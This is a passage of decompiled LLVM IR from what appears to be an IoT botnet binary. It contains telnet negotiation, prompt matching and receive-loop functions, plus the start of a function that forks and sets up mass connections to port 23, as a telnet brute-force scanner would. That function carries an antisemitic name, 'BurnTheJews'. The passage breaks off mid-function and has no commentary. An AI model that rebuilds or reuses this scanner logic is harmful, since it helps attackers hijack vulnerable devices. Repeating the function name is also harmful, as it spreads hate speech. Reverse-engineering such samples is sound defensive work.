  %v12_8051984 = or i32 %v6_8051984, %v9_8051984
  store i32 %v12_8051984, i32* %v5_8051984, align 4
  %v1_805198f = add i32 %arg1, 1
  %v2_8051993 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80519a6 = call i32 @__libc_select(i32 %v1_805198f, i32 0, i32 %v2_8051967, i32 0, i32 %v2_8051993)
  %tmp32 = icmp slt i32 %v5_80519a6, 1
  br i1 %tmp32, label %dec_label_pc_80519f2, label %dec_label_pc_80519b2

dec_label_pc_80519b2:                             ; preds = %dec_label_pc_805194a
  %v5_80519d4 = call i32 @getsockopt(i32 %arg1)
  %v3_80519dc = load i32, i32* %stack_var_-184, align 4
  %v1_80519e2 = icmp eq i32 %v3_80519dc, 0
  br i1 %v1_80519e2, label %dec_label_pc_8051a0a, label %dec_label_pc_80519e6

dec_label_pc_80519e6:                             ; preds = %dec_label_pc_80519b2
  br label %dec_label_pc_8051a43

dec_label_pc_80519f2:                             ; preds = %dec_label_pc_805194a
  br label %dec_label_pc_8051a43

dec_label_pc_80519fe:                             ; preds = %dec_label_pc_805193a
  br label %dec_label_pc_8051a43

dec_label_pc_8051a0a:                             ; preds = %dec_label_pc_80519b2, %dec_label_pc_8051903
  %v3_8051a14 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8051a1f = and i32 %v3_8051a14, -2049
  %v3_8051a31 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v4_8051a1f)
  br label %dec_label_pc_8051a43

dec_label_pc_8051a43:                             ; preds = %dec_label_pc_80519fe, %dec_label_pc_80519f2, %dec_label_pc_80519e6, %dec_label_pc_80518f4, %dec_label_pc_8051a0a
  %v3_8051a43 = phi i32 [ 0, %dec_label_pc_80519fe ], [ 0, %dec_label_pc_80519f2 ], [ 0, %dec_label_pc_80519e6 ], [ 0, %dec_label_pc_80518f4 ], [ 1, %dec_label_pc_8051a0a ]
  ret i32 %v3_8051a43

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32 (i32, i32*)* @getHost, { 3, 0, 1, 2 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051a43, { 4, 0, 1, 2, 3 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a4e = load i32, i32* @ebp, align 4
  store i32 %v0_8051a4e, i32* %stack_var_-4, align 4
  %v4_8051a4e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8051a4e, i32* @ebp, align 4
  %v1_8051a57 = add i32 %arg2, 1
  %v1_8051a58 = inttoptr i32 %v1_8051a57 to i8*
  %v2_8051a58 = load i8, i8* %v1_8051a58, align 1
  %v5_8051a58 = and i32 %v1_8051a57, -256
  %v9_8051a64 = icmp ult i8 %v2_8051a58, -5
  br i1 %v9_8051a64, label %dec_label_pc_8051b44, label %dec_label_pc_8051a71

dec_label_pc_8051a71:                             ; preds = %entry
  %v7_8051a78 = icmp eq i8 %v2_8051a58, -1
  br i1 %v7_8051a78, label %dec_label_pc_8051a7a, label %dec_label_pc_8051a94

dec_label_pc_8051a7a:                             ; preds = %dec_label_pc_8051a71
  br label %dec_label_pc_8051b44

dec_label_pc_8051a94:                             ; preds = %dec_label_pc_8051a71
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_8051a9f = ptrtoint i32* %stack_var_-5 to i32
  %v4_8051aa6 = call i32 @send(i32 %arg1, i32 %v2_8051a9f, i32 1, i32 16384)
  %v2_8051ab2 = load i8, i8* %v1_8051a58, align 1
  %v11_8051ab4 = icmp eq i8 %v2_8051ab2, -4
  %v1_8051ab6 = icmp eq i1 %v11_8051ab4, false
  br i1 %v1_8051ab6, label %dec_label_pc_8051abe, label %dec_label_pc_8051ab8

dec_label_pc_8051ab8:                             ; preds = %dec_label_pc_8051a94
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8051b0e

dec_label_pc_8051abe:                             ; preds = %dec_label_pc_8051a94
  %v2_8051ac2 = load i8, i8* %v1_8051a58, align 1
  %v11_8051ac4 = icmp eq i8 %v2_8051ac2, -2
  %v1_8051ac6 = icmp eq i1 %v11_8051ac4, false
  br i1 %v1_8051ac6, label %dec_label_pc_8051ace, label %dec_label_pc_8051ac8

dec_label_pc_8051ac8:                             ; preds = %dec_label_pc_8051abe
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8051b0e

dec_label_pc_8051ace:                             ; preds = %dec_label_pc_8051abe
  %v2_8051ad2 = load i8, i8* %v1_8051a58, align 1
  %v10_8051ad4 = icmp eq i8 %v2_8051ad2, 3
  %v1_8051ad6 = icmp eq i1 %v10_8051ad4, false
  %v11_8051afa = icmp eq i8 %v2_8051ad2, -3
  %v1_8051afc = icmp eq i1 %v11_8051afa, false
  br i1 %v1_8051ad6, label %dec_label_pc_8051af4, label %dec_label_pc_8051ad8

dec_label_pc_8051ad8:                             ; preds = %dec_label_pc_8051ace
  %. = select i1 %v1_8051afc, i32 253, i32 251
  %v7_8051aec = or i32 %., %v5_8051a58
  store i32 %v7_8051aec, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8051b0e

dec_label_pc_8051af4:                             ; preds = %dec_label_pc_8051ace
  %.2 = select i1 %v1_8051afc, i32 254, i32 252
  %v5_8051b08 = load i32, i32* @edx, align 4
  %v6_8051b08 = and i32 %v5_8051b08, -256
  %v7_8051b08 = or i32 %v6_8051b08, %.2
  store i32 %v7_8051b08, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8051b0e

dec_label_pc_8051b0e:                             ; preds = %dec_label_pc_8051ad8, %dec_label_pc_8051ac8, %dec_label_pc_8051ab8, %dec_label_pc_8051af4
  %v4_8051b1c = call i32 @send(i32 %arg1, i32 %v2_8051a9f, i32 1, i32 16384)
  %v1_8051b27 = add i32 %arg2, 2
  %v4_8051b35 = call i32 @send(i32 %arg1, i32 %v1_8051b27, i32 1, i32 16384)
  %v2_8051b47.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b44

dec_label_pc_8051b44:                             ; preds = %dec_label_pc_8051a7a, %dec_label_pc_8051b0e, %entry
  %v2_8051b47 = phi i32 [ %v0_8051a4e, %dec_label_pc_8051a7a ], [ %v2_8051b47.pre, %dec_label_pc_8051b0e ], [ %v0_8051a4e, %entry ]
  store i32 %v2_8051b47, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 251, { 1, 0 }
  uselistorder i32 253, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051b44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051b0e, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8051b57 = ptrtoint i8* %arg1 to i32
  %v3_8051b68 = call i32 @_strlen(i8* %arg1)
  %v4_8051b68 = mul i32 %v3_8051b68, -1
  %v1_8051b6e = sub i32 0, %v4_8051b68
  %v6_8051b95 = sub i32 %v4_8051b57, %v4_8051b68
  br label %dec_label_pc_8051c17

dec_label_pc_8051b85:                             ; preds = %dec_label_pc_8051bd5, %dec_label_pc_8051bbe, %dec_label_pc_8051ba7, %dec_label_pc_8051b90
  %v4_8051b85 = add nsw i32 %stack_var_-12.030, 1
  %v7_8051b8e = icmp slt i32 %v4_8051b85, %v1_8051b6e
  br i1 %v7_8051b8e, label %dec_label_pc_8051b90, label %dec_label_pc_8051b88.dec_label_pc_8051bec_crit_edge

dec_label_pc_8051b88.dec_label_pc_8051bec_crit_edge: ; preds = %dec_label_pc_8051b85, %dec_label_pc_8051b88.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8051b88.preheader ], [ %v4_8051b85, %dec_label_pc_8051b85 ]
  %.pre = sub i32 %v6_8051b95, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8051bec

dec_label_pc_8051b90:                             ; preds = %dec_label_pc_8051b88.preheader, %dec_label_pc_8051b85
  %stack_var_-12.030 = phi i32 [ %v4_8051b85, %dec_label_pc_8051b85 ], [ %stack_var_-12.1, %dec_label_pc_8051b88.preheader ]
  %v2_8051b9d = sub i32 %v6_8051b95, %stack_var_-12.030
  %v1_8051ba1 = inttoptr i32 %v2_8051b9d to i8*
  %v2_8051ba1 = load i8, i8* %v1_8051ba1, align 1
  %v4_8051ba3 = icmp eq i8 %v2_8051ba1, 0
  br i1 %v4_8051ba3, label %dec_label_pc_8051b85, label %dec_label_pc_8051ba7

dec_label_pc_8051ba7:                             ; preds = %dec_label_pc_8051b90
  %v2_8051bb8 = load i8, i8* %v1_8051ba1, align 1
  %v7_8051bba = icmp eq i8 %v2_8051bb8, 32
  br i1 %v7_8051bba, label %dec_label_pc_8051b85, label %dec_label_pc_8051bbe

dec_label_pc_8051bbe:                             ; preds = %dec_label_pc_8051ba7
  %v2_8051bcf = load i8, i8* %v1_8051ba1, align 1
  %v10_8051bd1 = icmp eq i8 %v2_8051bcf, 13
  br i1 %v10_8051bd1, label %dec_label_pc_8051b85, label %dec_label_pc_8051bd5

dec_label_pc_8051bd5:                             ; preds = %dec_label_pc_8051bbe
  %v2_8051be6 = load i8, i8* %v1_8051ba1, align 1
  %v10_8051be8 = icmp eq i8 %v2_8051be6, 10
  br i1 %v10_8051be8, label %dec_label_pc_8051b85, label %dec_label_pc_8051bec

dec_label_pc_8051bec:                             ; preds = %dec_label_pc_8051bd5, %dec_label_pc_8051b88.dec_label_pc_8051bec_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8051b88.dec_label_pc_8051bec_crit_edge ], [ %stack_var_-12.030, %dec_label_pc_8051bd5 ]
  %v1_8051bfd.pre-phi = phi i8* [ %.pre9, %dec_label_pc_8051b88.dec_label_pc_8051bec_crit_edge ], [ %v1_8051ba1, %dec_label_pc_8051bd5 ]
  %v2_8051bfd = load i8, i8* %v1_8051bfd.pre-phi, align 1
  %v6_8051c02 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_806a38c.319 to i32)
  %v1_8051c05 = inttoptr i32 %v6_8051c02 to i8*
  %v2_8051c05 = load i8, i8* %v1_8051c05, align 1
  %v15_8051c07 = icmp eq i8 %v2_8051bfd, %v2_8051c05
  %v1_8051c09 = icmp eq i1 %v15_8051c07, false
  br i1 %v1_8051c09, label %dec_label_pc_8051c14, label %dec_label_pc_8051c41

dec_label_pc_8051c14:                             ; preds = %dec_label_pc_8051bec
  %v4_8051c14 = add i32 %storemerge2, 1
  br label %dec_label_pc_8051c17

dec_label_pc_8051c17:                             ; preds = %entry, %dec_label_pc_8051c14
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.021, %dec_label_pc_8051c14 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_8051c14, %dec_label_pc_8051c14 ]
  %v3_8051c2b = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806a38c.319, i32 0, i32 0))
  %v7_8051c32 = icmp ult i32 %storemerge2, %v3_8051c2b
  br i1 %v7_8051c32, label %dec_label_pc_8051b88.preheader, label %dec_label_pc_8051c41

dec_label_pc_8051b88.preheader:                   ; preds = %dec_label_pc_8051c17
  %v7_8051b8e29 = icmp slt i32 %stack_var_-12.1, %v1_8051b6e
  br i1 %v7_8051b8e29, label %dec_label_pc_8051b90, label %dec_label_pc_8051b88.dec_label_pc_8051bec_crit_edge

dec_label_pc_8051c41:                             ; preds = %dec_label_pc_8051c17, %dec_label_pc_8051bec
  %storemerge = phi i32 [ 1, %dec_label_pc_8051bec ], [ 0, %dec_label_pc_8051c17 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8051b95, { 1, 0 }
  uselistorder [6 x i8]* @global_var_806a38c.319, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051c17, { 1, 0 }
  uselistorder label %dec_label_pc_8051b88.dec_label_pc_8051bec_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8051c90 = ptrtoint i32* %stack_var_-160 to i32
  %tmp33 = bitcast i32* %stack_var_-160 to i8*
  %v1_8051caa = urem i32 %arg1, 32
  %v9_8051cad = shl i32 1, %v1_8051caa
  %v1_8051cb8 = add i32 %arg1, 1
  %v2_8051cbc = ptrtoint i32* %stack_var_-168 to i32
  %v2_8051d8b = inttoptr i32 %arg2 to i8*
  %v4_8051d97 = icmp eq i32 %arg3, 0
  %v1_8051db840 = add i32 %arg8, 2
  %v5_8051dbe48 = icmp slt i32 %v1_8051db840, %arg7
  br i1 %v5_8051dbe48, label %dec_label_pc_8051dc0.lr.ph, label %dec_label_pc_8051dee

dec_label_pc_8051dc0.lr.ph:                       ; preds = %entry
  %v2_8051ca4 = udiv i32 %arg1, 32
  %v2_8051cad = mul nuw nsw i32 %v2_8051ca4, 4
  %v3_8051cad = add nsw i32 %v2_8051cad, -156
  %v5_8051ce2 = ptrtoint i8* %arg6 to i32
  %tmp38 = icmp slt i32 %arg5, 1
  %tmp39 = icmp eq i1 %tmp38, false
  br label %dec_label_pc_8051dc0

dec_label_pc_8051c86:                             ; preds = %dec_label_pc_8051dce, %dec_label_pc_8051dc0
  store i32 %v2_8051c90, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8051c97 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8051cad = load i32, i32* @ebp, align 4
  %v4_8051cad = add i32 %v3_8051cad, %v0_8051cad
  %v5_8051cad = inttoptr i32 %v4_8051cad to i32*
  %v6_8051cad = load i32, i32* %v5_8051cad, align 4
  %v12_8051cad = or i32 %v6_8051cad, %v9_8051cad
  store i32 %v12_8051cad, i32* %v5_8051cad, align 4
  %v5_8051ccf = call i32 @__libc_select(i32 %v1_8051cb8, i32 %v2_8051c90, i32 0, i32 0, i32 %v2_8051cbc)
  %tmp35 = icmp slt i32 %v5_8051ccf, 1
  br i1 %tmp35, label %dec_label_pc_8051dee, label %dec_label_pc_8051cdf

dec_label_pc_8051cdf:                             ; preds = %dec_label_pc_8051c86
  %v6_8051ce2 = add i32 %stack_var_-32.049, %v5_8051ce2
  %v5_8051ce5 = inttoptr i32 %v6_8051ce2 to i8*
  %v5_8051cf2 = call i32 @recv(i32 %arg1, i32 %v6_8051ce2, i32 1, i32 0)
  %v13_8051cfd = icmp eq i32 %v5_8051cf2, -1
  br i1 %v13_8051cfd, label %dec_label_pc_8051d09, label %dec_label_pc_8051d03

dec_label_pc_8051d03:                             ; preds = %dec_label_pc_8051cdf
  %v4_8051d03 = icmp eq i32 %v5_8051cf2, 0
  %v1_8051d07 = icmp eq i1 %v4_8051d03, false
  br i1 %v1_8051d07, label %dec_label_pc_8051d18, label %dec_label_pc_8051d09

dec_label_pc_8051d09:                             ; preds = %dec_label_pc_8051d03, %dec_label_pc_8051cdf
  br label %dec_label_pc_8051df8

dec_label_pc_8051d18:                             ; preds = %dec_label_pc_8051d03
  %v5_8051d1b = add i32 %v5_8051cf2, %stack_var_-32.049
  %v2_8051d21 = load i8, i8* %v5_8051ce5, align 1
  %v11_8051d23 = icmp eq i8 %v2_8051d21, -1
  %v1_8051d25 = icmp eq i1 %v11_8051d23, false
  br i1 %v1_8051d25, label %dec_label_pc_8051d82, label %dec_label_pc_8051d27

dec_label_pc_8051d27:                             ; preds = %dec_label_pc_8051d18
  %v1_8051d2a = add i32 %v6_8051ce2, 1
  %v5_8051d33 = call i32 @recv(i32 %arg1, i32 %v1_8051d2a, i32 2, i32 0)
  %v13_8051d3e = icmp eq i32 %v5_8051d33, -1
  br i1 %v13_8051d3e, label %dec_label_pc_8051d4a, label %dec_label_pc_8051d44

dec_label_pc_8051d44:                             ; preds = %dec_label_pc_8051d27
  %v4_8051d44 = icmp eq i32 %v5_8051d33, 0
  %v1_8051d48 = icmp eq i1 %v4_8051d44, false
  br i1 %v1_8051d48, label %dec_label_pc_8051d59, label %dec_label_pc_8051d4a

dec_label_pc_8051d4a:                             ; preds = %dec_label_pc_8051d44, %dec_label_pc_8051d27
  br label %dec_label_pc_8051df8

dec_label_pc_8051d59:                             ; preds = %dec_label_pc_8051d44
  %v5_8051d5c = add i32 %v5_8051d33, %v5_8051d1b
  %v3_8051d6a = call i32 @negotiate(i32 %arg1, i32 %v6_8051ce2, i32 3)
  %v1_8051d72 = icmp eq i32 %v3_8051d6a, 0
  %v1_8051d74 = icmp eq i1 %v1_8051d72, false
  br i1 %v1_8051d74, label %dec_label_pc_8051db5.backedge, label %dec_label_pc_8051d76

dec_label_pc_8051db5.backedge:                    ; preds = %dec_label_pc_8051d59, %dec_label_pc_8051d97, %dec_label_pc_8051d9d
  %stack_var_-32.0.be = phi i32 [ %v5_8051d1b, %dec_label_pc_8051d97 ], [ %v5_8051d1b, %dec_label_pc_8051d9d ], [ %v5_8051d5c, %dec_label_pc_8051d59 ]
  %v1_8051db8 = add i32 %stack_var_-32.0.be, 2
  %v5_8051dbe = icmp slt i32 %v1_8051db8, %arg7
  br i1 %v5_8051dbe, label %dec_label_pc_8051db5.backedge.dec_label_pc_8051dc0_crit_edge, label %dec_label_pc_8051dee

dec_label_pc_8051db5.backedge.dec_label_pc_8051dc0_crit_edge: ; preds = %dec_label_pc_8051db5.backedge
  %v3_8051dc0.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8051dc0

dec_label_pc_8051d76:                             ; preds = %dec_label_pc_8051d59
  br label %dec_label_pc_8051df8

dec_label_pc_8051d82:                             ; preds = %dec_label_pc_8051d18
  %v3_8051d8b = call i32 @strstr(i32 %v5_8051ce2, i8* %v2_8051d8b)
  %v1_8051d93 = icmp eq i32 %v3_8051d8b, 0
  %v1_8051d95 = icmp eq i1 %v1_8051d93, false
  br i1 %v1_8051d95, label %dec_label_pc_8051de2, label %dec_label_pc_8051d97

dec_label_pc_8051d97:                             ; preds = %dec_label_pc_8051d82
  br i1 %v4_8051d97, label %dec_label_pc_8051db5.backedge, label %dec_label_pc_8051d9d

dec_label_pc_8051d9d:                             ; preds = %dec_label_pc_8051d97
  %v3_8051da0 = call i32 @matchPrompt(i8* %arg6)
  %v1_8051da8 = icmp eq i32 %v3_8051da0, 0
  br i1 %v1_8051da8, label %dec_label_pc_8051db5.backedge, label %dec_label_pc_8051de2

dec_label_pc_8051dc0:                             ; preds = %dec_label_pc_8051db5.backedge.dec_label_pc_8051dc0_crit_edge, %dec_label_pc_8051dc0.lr.ph
  %v3_8051dc0 = phi i32 [ %arg4, %dec_label_pc_8051dc0.lr.ph ], [ %v3_8051dc0.pre, %dec_label_pc_8051db5.backedge.dec_label_pc_8051dc0_crit_edge ]
  %stack_var_-32.049 = phi i32 [ %arg8, %dec_label_pc_8051dc0.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8051db5.backedge.dec_label_pc_8051dc0_crit_edge ]
  %tmp36 = icmp slt i32 %v3_8051dc0, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br i1 %tmp37, label %dec_label_pc_8051c86, label %dec_label_pc_8051dce

dec_label_pc_8051dce:                             ; preds = %dec_label_pc_8051dc0
  br i1 %tmp39, label %dec_label_pc_8051c86, label %dec_label_pc_8051dee

dec_label_pc_8051de2:                             ; preds = %dec_label_pc_8051d9d, %dec_label_pc_8051d82
  br label %dec_label_pc_8051df8

dec_label_pc_8051dee:                             ; preds = %dec_label_pc_8051db5.backedge, %dec_label_pc_8051dce, %dec_label_pc_8051c86, %entry
  br label %dec_label_pc_8051df8

dec_label_pc_8051df8:                             ; preds = %dec_label_pc_8051de2, %dec_label_pc_8051d76, %dec_label_pc_8051d4a, %dec_label_pc_8051d09, %dec_label_pc_8051dee
  %v3_8051df8 = phi i32 [ 1, %dec_label_pc_8051de2 ], [ 0, %dec_label_pc_8051d76 ], [ 0, %dec_label_pc_8051d4a ], [ 0, %dec_label_pc_8051d09 ], [ 0, %dec_label_pc_8051dee ]
  ret i32 %v3_8051df8

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_8051d33, { 1, 2, 0 }
  uselistorder i32 %v5_8051cf2, { 1, 2, 0 }
  uselistorder i32 %v5_8051ce2, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051df8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051dee, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051db5.backedge, { 2, 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e03 = load i32, i32* @ebp, align 4
  store i32 %v0_8051e03, i32* %stack_var_-4, align 4
  %v4_8051e03 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8051e03, i32* @ebp, align 4
  %v4_8051e09 = add i32 %arg1, -2
  %v9_8051e09 = sub i32 1, %arg1
  %v10_8051e09 = and i32 %v9_8051e09, %arg1
  %v11_8051e09 = icmp slt i32 %v10_8051e09, 0
  %v12_8051e09 = icmp eq i32 %v4_8051e09, 0
  %v13_8051e09 = icmp slt i32 %v4_8051e09, 0
  %v3_8051e0d = icmp eq i1 %v13_8051e09, %v11_8051e09
  %v4_8051e0d = icmp eq i1 %v12_8051e09, false
  %v5_8051e0d = and i1 %v4_8051e0d, %v3_8051e0d
  br i1 %v5_8051e0d, label %dec_label_pc_8051e18, label %dec_label_pc_8051e2d

dec_label_pc_8051e18:                             ; preds = %entry
  %v1_8051e1e = call i32 @close(i32 %arg1)
  br label %dec_label_pc_8051e2d

dec_label_pc_8051e2d:                             ; preds = %entry, %dec_label_pc_8051e18
  %storemerge = phi i32 [ 0, %dec_label_pc_8051e18 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8051e09, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051e2d, { 1, 0 }
}

define i32 @BurnTheJews(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-684 = alloca i32, align 4
  %stack_var_-668 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051e35 = load i32, i32* @edi, align 4
  %v0_8051e36 = load i32, i32* @esi, align 4
  %v0_8051e37 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e37, i32* %stack_var_-16, align 4
  %v15_8051e38 = ptrtoint i32* %stack_var_-668 to i32
  store i32 %v15_8051e38, i32* %eax.global-to-local, align 4
  %v1_8051e46 = call i32 @fork(i32 %v15_8051e38)
  store i32 %v1_8051e46, i32* %eax.global-to-local, align 4
  %v1_8051e4b = icmp eq i32 %v1_8051e46, 0
  br i1 %v1_8051e4b, label %dec_label_pc_8052d78, label %dec_label_pc_8051e53

dec_label_pc_8051e53:                             ; preds = %entry
  store i32 0, i32* %stack_var_-684, align 4
  %v2_8051e58 = call i32 @__GI_time(i32* null)
  store i32 %v2_8051e58, i32* %eax.global-to-local, align 4
  store i32 %v2_8051e58, i32* @ebx, align 4
  %v1_8051e62 = call i32 @__libc_getpid(i32 0)
  store i32 %v1_8051e62, i32* %eax.global-to-local, align 4
  %v0_8051e67 = load i32, i32* @ebx, align 4
  %v2_8051e67 = xor i32 %v0_8051e67, %v1_8051e62
  store i32 %v2_8051e67, i32* @ebx, align 4
  %v0_8051e69 = load i32, i32* %stack_var_-684, align 4
  %v1_8051e69 = call i32 @getppid(i32 %v0_8051e69)
  %v0_8051e6e = load i32, i32* @ebx, align 4
  %v2_8051e6e = add i32 %v0_8051e6e, %v1_8051e69
  store i32 %v2_8051e6e, i32* %eax.global-to-local, align 4
  store i32 %v2_8051e6e, i32* %stack_var_-684, align 4
  %v1_8051e75 = call i32 @srand(i32 %v2_8051e6e)
  store i32 %v1_8051e75, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-684, align 4
  %v2_8051e82 = call i32 @__GI_time(i32* null)
  store i32 %v2_8051e82, i32* %eax.global-to-local, align 4
  store i32 %v2_8051e82, i32* @ebx, align 4
  %v1_8051e8c = call i32 @__libc_getpid(i32 0)
  %v1_8051e91 = load i32, i32* @ebx, align 4
  %v2_8051e91 = xor i32 %v1_8051e91, %v1_8051e8c
  store i32 %v2_8051e91, i32* %eax.global-to-local, align 4
  %v1_8051e94 = call i32 @init_rand(i32 %v2_8051e91)
  store i32 %v1_8051e94, i32* %eax.global-to-local, align 4
  %v1_8051e9c = call i32 @getdtablesize(i32 %v2_8051e91)
  %v1_8051ea1 = add i32 %v1_8051e9c, -100
  %v7_8051ead = icmp sgt i32 %v1_8051ea1, %arg2
  br i1 %v7_8051ead, label %dec_label_pc_8051eaf, label %dec_label_pc_8051eb5

dec_label_pc_8051eaf:                             ; preds = %dec_label_pc_8051e53
  br label %dec_label_pc_8051eb5

dec_label_pc_8051eb5:                             ; preds = %dec_label_pc_8051e53, %dec_label_pc_8051eaf
  %stack_var_-56.0 = phi i32 [ %arg2, %dec_label_pc_8051eaf ], [ %v1_8051ea1, %dec_label_pc_8051e53 ]
  %storemerge = phi i32 [ %arg2, %dec_label_pc_8051eaf ], [ %v1_8051ea1, %dec_label_pc_8051e53 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-608, align 4
  store i32 23, i32* %stack_var_-684, align 4
  %v1_8051ec3 = call i32 @htons(i32 23)
  %v2_8051ed9 = ptrtoint i32* %stack_var_-608 to i32
  %v15_8051edf = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v15_8051edf, i32* %eax.global-to-local, align 4
  store i32 %v15_8051edf, i32* %stack_var_-684, align 4
  %v3_8051ee3 = bitcast i32* %stack_var_-600 to i8*
  %v4_8051ee3 = call i32 @__GI_memset(i8* %v3_8051ee3, i32 0, i32 8)
  store i32 %v4_8051ee3, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-684, align 4
  %v1_8051ef3 = call i32 @malloc(i32 1025)
  store i32 %v1_8051ef3, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ef3, i32* %stack_var_-684, align 4
  %v3_8051f0b = inttoptr i32 %v1_8051ef3 to i8*
  %v4_8051f0b = call i32 @__GI_memset(i8* %v3_8051f0b, i32 0, i32 1025)
  %v2_8051f16 = mul i32 %stack_var_-56.0, 32
  %v1_8051f19 = or i32 %v2_8051f16, 15
  %v1_8051f1c = add i32 %v1_8051f19, 15
  %v2_8051f1f = and i32 %v1_8051f1c, -16
  %v2_8051f25 = sub i32 %v15_8051e38, %v2_8051f1f
  %v1_8051f33 = add i32 %v2_8051f25, 15
  %v2_8051f36 = and i32 %v1_8051f33, -16
  %v2_8051f53 = mul i32 %stack_var_-56.0, 5
  store i32 %v2_8051f53, i32* %eax.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v2_8051f5b = add i32 %v2_8051f25, -8
  %v3_8051f5b = inttoptr i32 %v2_8051f5b to i32*
  store i32 %v2_8051f53, i32* %v3_8051f5b, align 4
  %v1_8051f5c = add i32 %v2_8051f25, -12
  %v2_8051f5c = inttoptr i32 %v1_8051f5c to i32*
  store i32 0, i32* %v2_8051f5c, align 4
  %v0_8051f5e = load i32, i32* %edx.global-to-local, align 4
  %v2_8051f5e = add i32 %v2_8051f25, -16
  %v3_8051f5e = inttoptr i32 %v2_8051f5e to i32*
  store i32 %v0_8051f5e, i32* %v3_8051f5e, align 4
  %v3_8051f5f = inttoptr i32 %v2_8051f36 to i8*
  %v4_8051f5f = call i32 @__GI_memset(i8* %v3_8051f5f, i32 %tmp33, i32 %v15_8051e38)
  %v0_8051f64 = load i32, i32* @esp, align 4
  %v1_8051f64 = add i32 %v0_8051f64, 16
  store i32 0, i32* %eax.global-to-local, align 4
